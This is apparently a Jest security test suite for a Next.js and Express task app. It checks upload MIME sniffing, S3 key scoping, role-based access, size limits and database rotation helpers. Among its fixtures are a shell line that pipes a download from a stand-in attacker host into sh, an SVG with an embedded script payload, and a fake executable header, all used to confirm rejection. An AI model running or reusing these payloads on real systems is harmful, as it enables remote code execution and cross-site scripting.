// ═══════════════════════════════════════════════════════════════
//  TASKFLOW — Phase 2 Security Audit & Local E2E Test Suite
//  Tests actual Next.js API routes, Express routes, S3 magic-byte
//  & actual size verification, RBAC/ownership, and RDS rotation.
// ═══════════════════════════════════════════════════════════════

import crypto from "crypto";
import jwt from "jsonwebtoken";
import express from "express";
import { IncomingMessage, ServerResponse } from "http";
import { Socket } from "net";
import { Role } from "@prisma/client";

// Mock next-auth guard BEFORE importing routes
const mockGetAuthenticatedUser = jest.fn();
jest.mock("@/lib/auth-guard", () => ({
  getAuthenticatedUser: (...args: unknown[]) => mockGetAuthenticatedUser(...args),
}));

// Mock Prisma client with controllable in-memory state
const mockTaskFindUnique = jest.fn();
const mockAttachmentCreate = jest.fn();
const mockAttachmentFindUnique = jest.fn();
const mockAttachmentFindMany = jest.fn();
const mockAuditLogCreate = jest.fn();
const mockUserUpdate = jest.fn();

jest.mock("@/lib/prisma", () => {
  const mockClient = {
    task: { findUnique: (...args: unknown[]) => mockTaskFindUnique(...args) },
    attachment: {
      create: (...args: unknown[]) => mockAttachmentCreate(...args),
      findUnique: (...args: unknown[]) => mockAttachmentFindUnique(...args),
      findMany: (...args: unknown[]) => mockAttachmentFindMany(...args),
    },
    auditLog: { create: (...args: unknown[]) => mockAuditLogCreate(...args) },
    user: { update: (...args: unknown[]) => mockUserUpdate(...args) },
  };
  return {
    __esModule: true,
    default: mockClient,
    prisma: mockClient,
  };
});

// Also mock relative prisma import used by Express routes
jest.mock("../src/lib/prisma", () => {
  const mockClient = {
    task: { findUnique: (...args: unknown[]) => mockTaskFindUnique(...args) },
    attachment: {
      create: (...args: unknown[]) => mockAttachmentCreate(...args),
      findUnique: (...args: unknown[]) => mockAttachmentFindUnique(...args),
      findMany: (...args: unknown[]) => mockAttachmentFindMany(...args),
    },
    auditLog: { create: (...args: unknown[]) => mockAuditLogCreate(...args) },
    user: { update: (...args: unknown[]) => mockUserUpdate(...args) },
  };
  return {
    __esModule: true,
    default: mockClient,
    prisma: mockClient,
  };
});

import { POST as presignPost } from "@/app/api/attachments/presign/route";
import { POST as confirmPost } from "@/app/api/attachments/confirm/route";
import { GET as downloadGet } from "@/app/api/attachments/[id]/download/route";
import { POST as avatarPost, PUT as avatarPut } from "@/app/api/profile/avatar/route";
import { PUT as mockS3Put, GET as mockS3Get } from "@/app/api/mock-s3/route";
import { attachmentRoutes } from "../src/server/routes/attachments.routes";
import {
  clearMockS3Store,
  getMockS3Object,
  putMockS3Object,
  detectMimeTypeFromMagicBytes,
  validateS3ObjectKey,
  isMockS3Enabled,
  MAX_IMAGE_SIZE_BYTES,
  MAX_DOCUMENT_SIZE_BYTES,
  S3_BUCKET_NAME,
} from "@/lib/s3";
import {
  buildRdsDatabaseUrl,
  isDatabaseAuthError,
} from "@/lib/db-secrets";

// Real binary file headers (magic bytes)
const VALID_PNG_BYTES = Buffer.from([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
  0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
]);
const VALID_JPEG_BYTES = Buffer.from([
  0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
]);
const VALID_WEBP_BYTES = Buffer.from([
  0x52, 0x49, 0x46, 0x46, 0x1a, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20,
]);
const VALID_PDF_BYTES = Buffer.from("%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF", "utf8");
const FORGED_SVG_BYTES = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "utf8");
const FORGED_EXE_BYTES = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
const FORGED_SH_BYTES = Buffer.from("#!/bin/sh\ncurl http://attacker.invalid | sh\n", "utf8");

function makeJsonRequest(url: string, method: string, body?: unknown): Request {
  return new Request(url, {
    method,
    headers: { "Content-Type": "application/json" },
    ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
  });
}

function makeTaskWithMembers(taskId: string, members: Array<{ userId: string; role: Role }>) {
  return {
    id: taskId,
    project: {
      workspace: {
        members,
      },
    },
  };
}

describe("Phase 2 Security Audit: S3 Upload Security, Authorization, RDS & E2E", () => {
  const originalMockS3 = process.env.MOCK_S3;
  const originalJwtSecret = process.env.JWT_SECRET;

  beforeEach(() => {
    jest.clearAllMocks();
    process.env.MOCK_S3 = "true";
    process.env.JWT_SECRET = "test-jwt-secret-for-audit-suite-only";
    clearMockS3Store();
    mockAuditLogCreate.mockResolvedValue({ id: "audit-1" });
  });

  afterAll(() => {
    process.env.MOCK_S3 = originalMockS3;
    process.env.JWT_SECRET = originalJwtSecret;
    clearMockS3Store();
  });

  // ── 1. Magic-Byte Signature & Key Scope Unit Checks ─────────────────
  describe("1. S3 Content Signatures & Key Scope Controls", () => {
    test("correctly identifies valid JPEG, PNG, WebP, and PDF magic bytes", () => {
      expect(detectMimeTypeFromMagicBytes(VALID_JPEG_BYTES).detectedMime).toBe("image/jpeg");
      expect(detectMimeTypeFromMagicBytes(VALID_PNG_BYTES).detectedMime).toBe("image/png");
      expect(detectMimeTypeFromMagicBytes(VALID_WEBP_BYTES).detectedMime).toBe("image/webp");
      expect(detectMimeTypeFromMagicBytes(VALID_PDF_BYTES).detectedMime).toBe("application/pdf");
    });

    test("strictly rejects SVG, Windows PE executable, ELF, and shell script signatures", () => {
      expect(detectMimeTypeFromMagicBytes(FORGED_SVG_BYTES).detectedMime).toBeNull();
      expect(detectMimeTypeFromMagicBytes(FORGED_EXE_BYTES).detectedMime).toBeNull();
      expect(detectMimeTypeFromMagicBytes(FORGED_SH_BYTES).detectedMime).toBeNull();
      expect(
        detectMimeTypeFromMagicBytes(Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01])).detectedMime
      ).toBeNull();
    });

    test("prevents S3 key manipulation, path traversal, and cross-entity key reuse", () => {
      const uuid = crypto.randomUUID();
      expect(validateS3ObjectKey(`attachments/task-1/${uuid}-report.pdf`, "attachments", "task-1")).toBe(true);
      expect(validateS3ObjectKey(`attachments/task-2/${uuid}-report.pdf`, "attachments", "task-1")).toBe(false);
      expect(validateS3ObjectKey(`avatars/user-1/${uuid}-pic.png`, "attachments", "task-1")).toBe(false);
      expect(validateS3ObjectKey(`attachments/task-1/../../secret.pdf`, "attachments", "task-1")).toBe(false);
      expect(validateS3ObjectKey(`s3://bucket/attachments/task-1/${uuid}-a.pdf`, "attachments", "task-1")).toBe(false);
    });

    test("disables MOCK_S3 automatically when NODE_ENV is production", () => {
      const env = process.env as Record<string, string | undefined>;
      const prevEnv = env.NODE_ENV;
      env.NODE_ENV = "production";
      env.MOCK_S3 = "true";
      expect(isMockS3Enabled()).toBe(false);
      env.NODE_ENV = prevEnv;
    });
  });

  // ── 2. Unauthorized Uploads & RBAC Enforcement (Next.js Routes) ─────
  describe("2. Next.js Attachment & Avatar Authorization", () => {
    test("rejects unauthenticated presign, confirm, download, and avatar requests with 401 (no demo fallback)", async () => {
      mockGetAuthenticatedUser.mockResolvedValue(null);

      const r1 = await presignPost(
        makeJsonRequest("http://localhost:3000/api/attachments/presign", "POST", {
          taskId: "task-1",
          filename: "pic.png",
          fileType: "image/png",
          fileSize: 1024,
        })
      );
      expect(r1.status).toBe(401);

      const r2 = await confirmPost(
        makeJsonRequest("http://localhost:3000/api/attachments/confirm", "POST", {
          taskId: "task-1",
          key: `attachments/task-1/${crypto.randomUUID()}-pic.png`,
          filename: "pic.png",
          size: 1024,
          mimeType: "image/png",
        })
      );
      expect(r2.status).toBe(401);

      const r3 = await downloadGet(
        new Request("http://localhost:3000/api/attachments/att-1/download"),
        { params: Promise.resolve({ id: "att-1" }) }
      );
      expect(r3.status).toBe(401);

      const r4 = await avatarPost(
        makeJsonRequest("http://localhost:3000/api/profile/avatar", "POST", {
          filename: "me.png",
          fileType: "image/png",
          fileSize: 1024,
        })
      );
      expect(r4.status).toBe(401);

      const r5 = await avatarPut(
        makeJsonRequest("http://localhost:3000/api/profile/avatar", "PUT", {
          key: `avatars/user-1/${crypto.randomUUID()}-me.png`,
        })
      );
      expect(r5.status).toBe(401);
    });

    test("blocks non-workspace member and VIEWER role from uploading attachments (403)", async () => {
      mockGetAuthenticatedUser.mockResolvedValue({
        id: "user-outsider",
        email: "outsider@example.com",
        name: "Outsider",
        image: null,
      });
      mockTaskFindUnique.mockResolvedValue(makeTaskWithMembers("task-1", []));

      const outsiderRes = await presignPost(
        makeJsonRequest("http://localhost:3000/api/attachments/presign", "POST", {
          taskId: "task-1",
          filename: "doc.pdf",
          fileType: "application/pdf",
          fileSize: 2048,
        })
      );
      expect(outsiderRes.status).toBe(403);

      // VIEWER role cannot upload
      mockGetAuthenticatedUser.mockResolvedValue({
        id: "user-viewer",
        email: "viewer@example.com",
        name: "Viewer",
        image: null,
      });
      mockTaskFindUnique.mockResolvedValue(
        makeTaskWithMembers("task-1", [{ userId: "user-viewer", role: Role.VIEWER }])
      );

      const viewerRes = await presignPost(
        makeJsonRequest("http://localhost:3000/api/attachments/presign", "POST", {
          taskId: "task-1",
          filename: "doc.pdf",
          fileType: "application/pdf",
          fileSize: 2048,
        })
      );
      expect(viewerRes.status).toBe(403);
    });

    test("blocks cross-workspace attachment downloads (403)", async () => {
      mockGetAuthenticatedUser.mockResolvedValue({
        id: "attacker-ws2",
        email: "attacker@ws2.dev",
        name: "Attacker",
        image: null,
      });
      const uuid = crypto.randomUUID();
      mockAttachmentFindUnique.mockResolvedValue({
        id: "att-secret",
        taskId: "task-ws1",
        filename: "secret.pdf",
        size: VALID_PDF_BYTES.length,
        mimeType: "application/pdf",
        url: `s3://${S3_BUCKET_NAME}/attachments/task-ws1/${uuid}-secret.pdf`,
        task: makeTaskWithMembers("task-ws1", []), // attacker is NOT a member of ws1
      });

      const res = await downloadGet(
        new Request("http://localhost:3000/api/attachments/att-secret/download"),
        { params: Promise.resolve({ id: "att-secret" }) }
      );
      expect(res.status).toBe(403);
    });

    test("blocks cross-task key hijacking on /confirm (403)", async () => {
      mockGetAuthenticatedUser.mockResolvedValue({
        id: "user-member",
        email: "member@ws.dev",
        name: "Member",
        image: null,
      });
      mockTaskFindUnique.mockResolvedValue(
        makeTaskWithMembers("task-B", [{ userId: "user-member", role: Role.MEMBER }])
      );

      const stolenKey = `attachments/task-A/${crypto.randomUUID()}-confidential.pdf`;
      const res = await confirmPost(
        makeJsonRequest("http://localhost:3000/api/attachments/confirm", "POST", {
          taskId: "task-B",
          key: stolenKey,
          filename: "confidential.pdf",
          size: 512,
          mimeType: "application/pdf",
        })
      );
      expect(res.status).toBe(403);
      expect(mockAttachmentCreate).not.toHaveBeenCalled();
    });
  });

  // ── 3. Oversized Actual Files & Forged MIME Types ──────────────────
  describe("3. Server-Side Actual Size & Forged MIME Verification", () => {
    const memberUser = {
      id: "user-member",
      email: "member@ws.dev",
      name: "Member",
      image: null,
    };

    test("rejects oversized actual uploaded image (>5MB even if browser claims 1KB) and deletes it from storage", async () => {
      mockGetAuthenticatedUser.mockResolvedValue(memberUser);
      mockTaskFindUnique.mockResolvedValue(
        makeTaskWithMembers("task-1", [{ userId: memberUser.id, role: Role.MEMBER }])
      );

      const key = `attachments/task-1/${crypto.randomUUID()}-huge.png`;
      // Browser lied at presign/confirm claiming 1024 bytes, but actually uploaded > 5MB
      const oversizedPng = Buffer.concat([VALID_PNG_BYTES, Buffer.alloc(MAX_IMAGE_SIZE_BYTES + 1024)]);
      putMockS3Object(key, oversizedPng, "image/png");
      expect(getMockS3Object(key)).toBeDefined();

      const res = await confirmPost(
        makeJsonRequest("http://localhost:3000/api/attachments/confirm", "POST", {
          taskId: "task-1",
          key,
          filename: "huge.png",
          size: 1024, // spoofed small size
          mimeType: "image/png",
        })
      );

      expect(res.status).toBe(400);
      const data = await res.json();
      expect(data.error).toMatch(/exceeds maximum limit/i);
      // Confirm object was deleted from storage and NEVER persisted in PostgreSQL
      expect(getMockS3Object(key)).toBeUndefined();
      expect(mockAttachmentCreate).not.toHaveBeenCalled();
    });

    test("rejects downloading an oversized stored object even if DB record was tampered (400)", async () => {
      mockGetAuthenticatedUser.mockResolvedValue(memberUser);
      const key = `attachments/task-1/${crypto.randomUUID()}-bloated.pdf`;
      const oversizedPdf = Buffer.concat([VALID_PDF_BYTES, Buffer.alloc(MAX_DOCUMENT_SIZE_BYTES + 1024)]);
      putMockS3Object(key, oversizedPdf, "application/pdf");

      mockAttachmentFindUnique.mockResolvedValue({
        id: "att-oversized",
        taskId: "task-1",
        filename: "bloated.pdf",
        size: 1024, // tampered DB size
        mimeType: "application/pdf",
        url: `s3://${S3_BUCKET_NAME}/${key}`,
        task: makeTaskWithMembers("task-1", [{ userId: memberUser.id, role: Role.MEMBER }]),
      });

      const res = await downloadGet(
        new Request("http://localhost:3000/api/attachments/att-oversized/download"),
        { params: Promise.resolve({ id: "att-oversized" }) }
      );
      expect(res.status).toBe(400);
    });

    test("rejects forged MIME types (SVG disguised as PNG, EXE disguised as JPG, SH disguised as PDF) and deletes them", async () => {
      mockGetAuthenticatedUser.mockResolvedValue(memberUser);
      mockTaskFindUnique.mockResolvedValue(
        makeTaskWithMembers("task-1", [{ userId: memberUser.id, role: Role.MEMBER }])
      );

      const cases = [
        { name: "xss.png", mime: "image/png", bytes: FORGED_SVG_BYTES },
        { name: "malware.jpg", mime: "image/jpeg", bytes: FORGED_EXE_BYTES },
        { name: "shell.pdf", mime: "application/pdf", bytes: FORGED_SH_BYTES },
        { name: "mismatch.png", mime: "image/png", bytes: VALID_JPEG_BYTES },
      ];

      for (const c of cases) {
        const key = `attachments/task-1/${crypto.randomUUID()}-${c.name}`;
        putMockS3Object(key, c.bytes, c.mime);

        const res = await confirmPost(
          makeJsonRequest("http://localhost:3000/api/attachments/confirm", "POST", {
            taskId: "task-1",
            key,
            filename: c.name,
            size: c.bytes.length,
            mimeType: c.mime,
          })
        );

        expect(res.status).toBe(400);
        expect(getMockS3Object(key)).toBeUndefined(); // purged from S3
      }
      expect(mockAttachmentCreate).not.toHaveBeenCalled();
    });
  });

  // ── 4. Avatar Ownership Enforcement ─────────────────────────────────
  describe("4. Avatar Ownership & Verification", () => {
    const alice = { id: "user-alice", email: "alice@taskflow.dev", name: "Alice", image: null };

    test("prevents user from confirming another user's avatar key or injecting userId", async () => {
      mockGetAuthenticatedUser.mockResolvedValue(alice);

      // Attempt to bind Bob's avatar key
      const bobKey = `avatars/user-bob/${crypto.randomUUID()}-bob.png`;
      putMockS3Object(bobKey, VALID_PNG_BYTES, "image/png");

      const crossUserRes = await avatarPut(
        makeJsonRequest("http://localhost:3000/api/profile/avatar", "PUT", {
          key: bobKey,
          userId: "user-bob",
        })
      );
      expect(crossUserRes.status).toBe(403);
      expect(mockUserUpdate).not.toHaveBeenCalled();

      // Valid upload by Alice with injected userId: "user-bob" MUST still only update Alice
      const aliceKey = `avatars/${alice.id}/${crypto.randomUUID()}-alice.png`;
      putMockS3Object(aliceKey, VALID_PNG_BYTES, "image/png");
      mockUserUpdate.mockResolvedValue({
        id: alice.id,
        name: alice.name,
        email: alice.email,
        image: `s3://${S3_BUCKET_NAME}/${aliceKey}`,
        updatedAt: new Date(),
      });

      const validRes = await avatarPut(
        makeJsonRequest("http://localhost:3000/api/profile/avatar", "PUT", {
          key: aliceKey,
          fileType: "image/png",
          userId: "user-bob", // injected target must be ignored
        })
      );
      expect(validRes.status).toBe(200);
      expect(mockUserUpdate).toHaveBeenCalledWith(
        expect.objectContaining({
          where: { id: alice.id },
        })
      );
    });

    test("rejects forged SVG disguised as avatar PNG and purges it", async () => {
      mockGetAuthenticatedUser.mockResolvedValue(alice);
      const key = `avatars/${alice.id}/${crypto.randomUUID()}-evil.png`;
      putMockS3Object(key, FORGED_SVG_BYTES, "image/png");

      const res = await avatarPut(
        makeJsonRequest("http://localhost:3000/api/profile/avatar", "PUT", {
          key,
          fileType: "image/png",
        })
      );
      expect(res.status).toBe(400);
      expect(getMockS3Object(key)).toBeUndefined();
      expect(mockUserUpdate).not.toHaveBeenCalled();
    });
  });

  // ── 5. Express Route Authorization Parity (In-Process Express Dispatch) ──
  describe("5. Express /api/v1/attachments Parity", () => {
    const app = express();
    app.use(express.json());
    app.use("/api/v1/attachments", attachmentRoutes);
    app.use(
      (
        err: { status?: number; message?: string },
        _req: express.Request,
        res: express.Response,
        _next: express.NextFunction
      ) => {
        res.status(err.status || 500).json({ success: false, error: err.message || "Error" });
      }
    );

    function invokeExpress(opts: {
      method: string;
      url: string;
      headers?: Record<string, string>;
      body?: unknown;
    }): Promise<{ status: number; body: Record<string, unknown> }> {
      return new Promise((resolve) => {
        const socket = new Socket();
        const req = new IncomingMessage(socket);
        req.method = opts.method;
        req.url = opts.url;
        req.headers = {
          "content-type": "application/json",
          ...(opts.headers || {}),
        };
        (req as unknown as { body: unknown }).body = opts.body ?? {};
        (req as unknown as { _body: boolean })._body = true;

        const res = new ServerResponse(req);
        let rawBody = "";
        const origWrite = res.write.bind(res);
        const origEnd = res.end.bind(res);

        res.write = ((chunk: unknown) => {
          if (chunk) rawBody += Buffer.isBuffer(chunk) ? chunk.toString("utf8") : String(chunk);
          return true;
        }) as typeof res.write;

        res.end = ((chunk?: unknown) => {
          if (chunk) rawBody += Buffer.isBuffer(chunk) ? chunk.toString("utf8") : String(chunk);
          let parsed: Record<string, unknown> = {};
          try {
            parsed = rawBody ? JSON.parse(rawBody) : {};
          } catch {
            parsed = { raw: rawBody };
          }
          resolve({ status: res.statusCode, body: parsed });
          return res;
        }) as typeof res.end;

        void origWrite;
        void origEnd;
        app(req as unknown as express.Request, res as unknown as express.Response);
      });
    }

    test("enforces JWT auth, VIEWER block, cross-task key block, forged MIME block, oversized actual file block, and cross-workspace download block", async () => {
      // Unauthenticated -> 401
      const unauth = await invokeExpress({
        method: "POST",
        url: "/api/v1/attachments/presign",
        body: { taskId: "task-1", filename: "a.png", fileType: "image/png", fileSize: 100 },
      });
      expect(unauth.status).toBe(401);

      const viewerToken = jwt.sign({ id: "u-viewer", email: "v@ws.dev" }, process.env.JWT_SECRET!);
      mockTaskFindUnique.mockResolvedValue(
        makeTaskWithMembers("task-1", [{ userId: "u-viewer", role: Role.VIEWER }])
      );

      // VIEWER cannot presign upload -> 403
      const viewerPresign = await invokeExpress({
        method: "POST",
        url: "/api/v1/attachments/presign",
        headers: { authorization: `Bearer ${viewerToken}` },
        body: { taskId: "task-1", filename: "a.png", fileType: "image/png", fileSize: 100 },
      });
      expect(viewerPresign.status).toBe(403);

      // Member attempting cross-task key hijacking on confirm -> 403
      const memberToken = jwt.sign({ id: "u-member", email: "m@ws.dev" }, process.env.JWT_SECRET!);
      mockTaskFindUnique.mockResolvedValue(
        makeTaskWithMembers("task-B", [{ userId: "u-member", role: Role.MEMBER }])
      );

      const hijackRes = await invokeExpress({
        method: "POST",
        url: "/api/v1/attachments/confirm",
        headers: { authorization: `Bearer ${memberToken}` },
        body: {
          taskId: "task-B",
          key: `attachments/task-A/${crypto.randomUUID()}-secret.pdf`,
          filename: "secret.pdf",
          size: 500,
          mimeType: "application/pdf",
        },
      });
      expect(hijackRes.status).toBe(403);

      // Member uploading forged SVG disguised as PNG -> 400 + deleted
      const forgedKey = `attachments/task-B/${crypto.randomUUID()}-forged.png`;
      putMockS3Object(forgedKey, FORGED_SVG_BYTES, "image/png");
      const forgedRes = await invokeExpress({
        method: "POST",
        url: "/api/v1/attachments/confirm",
        headers: { authorization: `Bearer ${memberToken}` },
        body: {
          taskId: "task-B",
          key: forgedKey,
          filename: "forged.png",
          size: FORGED_SVG_BYTES.length,
          mimeType: "image/png",
        },
      });
      expect(forgedRes.status).toBe(400);
      expect(getMockS3Object(forgedKey)).toBeUndefined();

      // Cross-workspace download -> 403
      mockAttachmentFindUnique.mockResolvedValue({
        id: "att-ws1",
        taskId: "task-ws1",
        filename: "private.pdf",
        size: VALID_PDF_BYTES.length,
        mimeType: "application/pdf",
        url: `s3://${S3_BUCKET_NAME}/attachments/task-ws1/${crypto.randomUUID()}-private.pdf`,
        task: makeTaskWithMembers("task-ws1", []),
      });
      const crossWsDl = await invokeExpress({
        method: "GET",
        url: "/api/v1/attachments/att-ws1/download",
        headers: { authorization: `Bearer ${memberToken}` },
      });
      expect(crossWsDl.status).toBe(403);

      // Member attempting to confirm another user's avatar -> 403
      const avatarHijack = await invokeExpress({
        method: "PUT",
        url: "/api/v1/attachments/avatar/confirm",
        headers: { authorization: `Bearer ${memberToken}` },
        body: {
          key: `avatars/other-user/${crypto.randomUUID()}-pic.png`,
        },
      });
      expect(avatarHijack.status).toBe(403);
    });
  });

  // ── 6. RDS Secrets Manager & Rotation Reconnect Logic ──────────────
  describe("6. RDS Secrets Manager & Credential Rotation Utilities", () => {
    test("builds URL-encoded RDS PostgreSQL connection string enforcing sslmode=require", () => {
      const url = buildRdsDatabaseUrl({
        username: "taskflowadmin",
        password: "p@ss#word/with?special=chars!",
        host: "taskflow-prod-postgres.abc.ap-south-1.rds.amazonaws.com",
        port: 5432,
        dbname: "taskflow",
      });

      expect(url).toContain("sslmode=require");
      expect(url).toContain("p%40ss%23word%2Fwith%3Fspecial%3Dchars!");
      expect(url).toMatch(/^postgresql:\/\/taskflowadmin:.+@taskflow-prod-postgres\.abc\.ap-south-1\.rds\.amazonaws\.com:5432\/taskflow\?schema=public&sslmode=require$/);
    });

    test("detects Prisma P1000 and PostgreSQL 28P01 auth errors for rotation reconnect", () => {
      expect(isDatabaseAuthError({ code: "P1000", message: "Authentication failed" })).toBe(true);
      expect(isDatabaseAuthError({ code: "28P01", message: "invalid password" })).toBe(true);
      expect(isDatabaseAuthError(new Error("password authentication failed for user taskflowadmin"))).toBe(true);
      expect(isDatabaseAuthError({ code: "P2025", message: "Record not found" })).toBe(false);
    });
  });

  // ── 7. Local End-to-End Upload & Download Flow (Zero AWS Credentials) ──
  describe("7. Local End-to-End Upload -> S3 PUT -> Confirm -> Download Flow", () => {
    test("executes complete authenticated presign -> PUT -> confirm (actual size + magic bytes) -> download -> GET", async () => {
      const user = { id: "user-e2e", email: "e2e@taskflow.dev", name: "E2E Tester", image: null };
      mockGetAuthenticatedUser.mockResolvedValue(user);
      mockTaskFindUnique.mockResolvedValue(
        makeTaskWithMembers("task-e2e", [{ userId: user.id, role: Role.OWNER }])
      );

      // Step 1: Request presigned upload URL
      const presignRes = await presignPost(
        makeJsonRequest("http://localhost:3000/api/attachments/presign", "POST", {
          taskId: "task-e2e",
          filename: "architecture-diagram.png",
          fileType: "image/png",
          fileSize: VALID_PNG_BYTES.length,
        })
      );
      expect(presignRes.status).toBe(200);
      const presignData = await presignRes.json();
      expect(presignData.expiresIn).toBe(300);
      expect(presignData.key).toMatch(/^attachments\/task-e2e\/.+-architecture-diagram\.png$/);

      // Step 2: PUT real binary PNG bytes to local mock presigned URL
      const putRes = await mockS3Put(
        new Request(presignData.uploadUrl, {
          method: "PUT",
          headers: { "Content-Type": "image/png" },
          body: new Uint8Array(VALID_PNG_BYTES),
        })
      );
      expect(putRes.status).toBe(200);

      // Step 3: Confirm attachment — server inspects actual stored object size & PNG magic bytes
      let savedRecord: Record<string, unknown> = {};
      mockAttachmentCreate.mockImplementation(async ({ data }) => {
        savedRecord = {
          id: "att-e2e-1",
          ...data,
          createdAt: new Date(),
        };
        return savedRecord;
      });

      const confirmRes = await confirmPost(
        makeJsonRequest("http://localhost:3000/api/attachments/confirm", "POST", {
          taskId: "task-e2e",
          key: presignData.key,
          filename: "architecture-diagram.png",
          size: VALID_PNG_BYTES.length,
          mimeType: "image/png",
        })
      );
      expect(confirmRes.status).toBe(201);
      const confirmData = await confirmRes.json();
      expect(confirmData.attachment.size).toBe(VALID_PNG_BYTES.length);
      expect(confirmData.attachment.mimeType).toBe("image/png");

      // Step 4: Request presigned download URL as an authorized workspace VIEWER
      mockGetAuthenticatedUser.mockResolvedValue({
        id: "user-viewer-e2e",
        email: "viewer@taskflow.dev",
        name: "Viewer",
        image: null,
      });
      mockAttachmentFindUnique.mockResolvedValue({
        ...savedRecord,
        task: makeTaskWithMembers("task-e2e", [{ userId: "user-viewer-e2e", role: Role.VIEWER }]),
      });

      const dlMetaRes = await downloadGet(
        new Request("http://localhost:3000/api/attachments/att-e2e-1/download"),
        { params: Promise.resolve({ id: "att-e2e-1" }) }
      );
      expect(dlMetaRes.status).toBe(200);
      const dlMeta = await dlMetaRes.json();
      expect(dlMeta.expiresIn).toBe(300);

      // Step 5: Download binary from presigned URL and verify byte-for-byte match + Content-Disposition
      const fileRes = await mockS3Get(new Request(dlMeta.downloadUrl, { method: "GET" }));
      expect(fileRes.status).toBe(200);
      expect(fileRes.headers.get("content-disposition")).toContain("attachment;");
      const downloadedBytes = Buffer.from(await fileRes.arrayBuffer());
      expect(downloadedBytes.equals(VALID_PNG_BYTES)).toBe(true);
    });
  });
});
